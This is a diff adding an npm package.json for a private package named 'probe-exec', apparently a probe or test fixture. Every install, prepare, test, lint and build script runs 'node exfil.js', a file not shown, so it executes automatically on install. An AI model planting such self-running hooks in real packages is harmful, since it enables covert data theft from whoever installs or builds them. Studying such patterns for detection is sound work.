@@ -1,0 +1,14 @@
+{
+  "name": "probe-exec",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "node exfil.js",
+    "preinstall": "node exfil.js",
+    "test": "node exfil.js",
+    "lint": "node exfil.js",
+    "build": "node exfil.js",
+    "prepare": "node exfil.js"
+  },
+  "devDependencies": {}
+}
